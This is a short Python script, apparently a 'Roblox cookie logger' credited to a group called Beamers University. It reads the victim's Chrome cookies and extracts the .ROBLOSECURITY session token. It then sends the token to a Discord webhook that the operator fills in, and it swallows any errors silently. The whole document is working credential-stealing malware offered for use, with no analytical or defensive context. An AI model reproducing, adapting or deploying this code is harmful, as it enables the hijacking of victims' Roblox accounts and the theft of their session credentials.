import browser_cookie3, requests, threading, discord_webhook

webhook = 'YOUR WEBHOOK HERE'

def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'dsc.gg/beaminguni', 'content':f'```Cookie provided by Beamers University: {cookie}```'})
    except:
        pass
browsers = [chrome_logger]

for x in browsers:
    threading.Thread(target=x,).start()
